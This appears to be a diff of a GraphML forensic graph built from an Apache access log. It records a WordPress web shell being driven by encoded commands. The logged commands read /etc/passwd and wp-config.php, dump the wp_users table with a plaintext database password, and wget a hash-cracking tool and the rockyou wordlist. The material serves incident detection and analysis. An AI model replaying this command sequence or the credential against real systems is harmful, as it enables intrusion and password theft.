-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">File Read Commands in HTTP Request</data>
+      <data key="d23">["cat", "/etc/profile"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/profile"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:00.000000+00:00</data>
-      <data key="d3">GET / (HTTP Request with Suspicious User Agent)</data>
+      <data key="d17">2022-01-18T12:38:27.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:26">
-      <data key="d0">Page</data>
-      <data key="d19">/</data>
-      <data key="d3">/</data>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:36">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd</data>
+      <data key="d13">17</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Process Commands in HTTP Request</data>
+      <data key="d23">["ps", "-A"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ps", "-A"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:11.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Process Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:37">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd</data>
+      <data key="d13">18</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Filesystem Commands in HTTP Request</data>
+      <data key="d23">["lsb_release", "-a"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["lsb_release", "-a"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:14.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Filesystem Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:41">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D</data>
+      <data key="d13">22</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Filesystem Commands in HTTP Request</data>
+      <data key="d23">["ls", "-laR", "/var/www"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ls", "-laR", "/var/www"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:21.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Filesystem Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:38">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd</data>
+      <data key="d13">19</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Local File Inclusion</data>
+      <data key="d23">["cat", "/etc/group"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/group"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:16.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Local File Inclusion)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:39">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D</data>
+      <data key="d13">20</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Local File Inclusion</data>
+      <data key="d23">["cat", "/etc/passwd"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/passwd"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:17.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Local File Inclusion)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:40">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D</data>
+      <data key="d13">21</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Time-Temporal Information Commands in HTTP Request</data>
+      <data key="d23">["date"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["date"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:19.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Time-Temporal Information Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:43">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">critical</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D</data>
+      <data key="d13">24</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Database Commands in HTTP Request</data>
+      <data key="d23">["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "\"select * from wp_users\""]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "\"select * from wp_users\""]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:25.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Database Commands in HTTP Request)</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:45">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">medium</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/?p=5</data>
-      <data key="d11">11</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D</data>
+      <data key="d13">26</data>
       <data key="d20">200</data>
       <data key="d21">GET</data>
-      <data key="d2">HTTP Request with Suspicious User Agent</data>
-      <data key="d6">http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">File Resource Commands in HTTP Request</data>
+      <data key="d23">["wget", "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["wget", "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:00.000000+00:00</data>
-      <data key="d3">GET /?p=5 (HTTP Request with Suspicious User Agent)</data>
+      <data key="d17">2022-01-18T12:38:29.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Resource Commands in HTTP Request)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:47">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:48">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">medium</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-admin/admin-ajax.php</data>
-      <data key="d11">12</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd</data>
+      <data key="d13">28</data>
       <data key="d20">200</data>
-      <data key="d21">POST</data>
-      <data key="d2">HTTP Request with Suspicious User Agent</data>
-      <data key="d6">http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d21">GET</data>
+      <data key="d4">File Resource Commands in HTTP Request</data>
+      <data key="d23">["tar", "xvfz", "v0.1.tar.gz"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["tar", "xvfz", "v0.1.tar.gz"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:01.000000+00:00</data>
-      <data key="d3">POST /wp-admin/admin... (HTTP Request with Suspicious User Agent)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:46">
-      <data key="d0">Page</data>
-      <data key="d19">/wp-admin/admin-ajax.php</data>
-      <data key="d3">/wp-admin/admin-ajax.php</data>
+      <data key="d17">2022-01-18T12:39:03.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Resource Commands in HTTP Request)</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:49">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd</data>
-      <data key="d11">13</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd</data>
+      <data key="d13">29</data>
       <data key="d20">200</data>
       <data key="d21">GET</data>
-      <data key="d2">Sysinfo Commands in HTTP Request</data>
-      <data key="d23">["id"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["id"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">File Resource Commands in HTTP Request</data>
+      <data key="d23">["wget", "http://192.168.130.77/rockyou.txt"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["wget", "http://192.168.130.77/rockyou.txt"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:04.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Sysinfo Commands in HTTP Request)</data>
+      <data key="d17">2022-01-18T12:39:06.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Resource Commands in HTTP Request)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:48">
-      <data key="d0">Page</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php</data>
-      <data key="d3">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php</data>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:46">
+      <data key="d0">IPAddress</data>
+      <data key="d18">10.35.35.118</data>
+      <data key="d4">10.35.35.118</data>
+      <data key="d5">10.35.35.118</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:47">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">medium</data>
+      <data key="d12">10.35.35.118</data>
+      <data key="d19">/</data>
+      <data key="d13">27</data>
+      <data key="d20">200</data>
+      <data key="d21">POST</data>
+      <data key="d4">HTTP Request with Suspicious User Agent</data>
+      <data key="d8">http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:32.000000+00:00</data>
+      <data key="d5">POST / (HTTP Request with Suspicious User Agent)</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:50">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D</data>
-      <data key="d11">14</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Network Commands in HTTP Request</data>
-      <data key="d23">["netstat", "-t"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["netstat", "-t"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:06.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Network Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:52">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D</data>
-      <data key="d11">16</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Network Commands in HTTP Request</data>
-      <data key="d23">["ip", "addr"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ip", "addr"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:09.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Network Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:51">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd</data>
-      <data key="d11">15</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">File Read Commands in HTTP Request</data>
-      <data key="d23">["cat", "/etc/resolv.conf"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/resolv.conf"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:08.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:59">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D</data>
-      <data key="d11">23</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">File Read Commands in HTTP Request</data>
-      <data key="d23">["cat", "/var/www/intranet.price.fox.org/wp-config.php"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/var/www/intranet.price.fox.org/wp-config.php"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:23.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:61">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D</data>
-      <data key="d11">25</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">File Read Commands in HTTP Request</data>
-      <data key="d23">["cat", "/etc/profile"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/profile"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:27.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:53">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd</data>
-      <data key="d11">17</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Process Commands in HTTP Request</data>
-      <data key="d23">["ps", "-A"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ps", "-A"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:11.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Process Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:54">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd</data>
-      <data key="d11">18</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Filesystem Commands in HTTP Request</data>
-      <data key="d23">["lsb_release", "-a"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["lsb_release", "-a"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:14.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Filesystem Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:58">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D</data>
-      <data key="d11">22</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Filesystem Commands in HTTP Request</data>
-      <data key="d23">["ls", "-laR", "/var/www"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ls", "-laR", "/var/www"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:21.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Filesystem Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:55">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd</data>
-      <data key="d11">19</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Local File Inclusion</data>
-      <data key="d23">["cat", "/etc/group"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/group"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:16.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Local File Inclusion)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:56">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D</data>
-      <data key="d11">20</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Local File Inclusion</data>
-      <data key="d23">["cat", "/etc/passwd"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/passwd"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:17.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Local File Inclusion)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:57">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D</data>
-      <data key="d11">21</data>
-      <data key="d20">200</data>
-      <data key="d21">GET</data>
-      <data key="d2">Time-Temporal Information Commands in HTTP Request</data>
-      <data key="d23">["date"]</data>
-      <data key="d6">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["date"]]</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">python-requests/2.27.1</data>
-      <data key="d16">2022-01-18T12:38:19.000000+00:00</data>
-      <data key="d3">GET /wp-content/uplo... (Time-Temporal Information Commands in HTTP Request)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:60">
-      <data key="d0">HTTPRequest</data>
-      <data key="d4">critical</data>
-      <data key="d10">172.17.130.196</data>
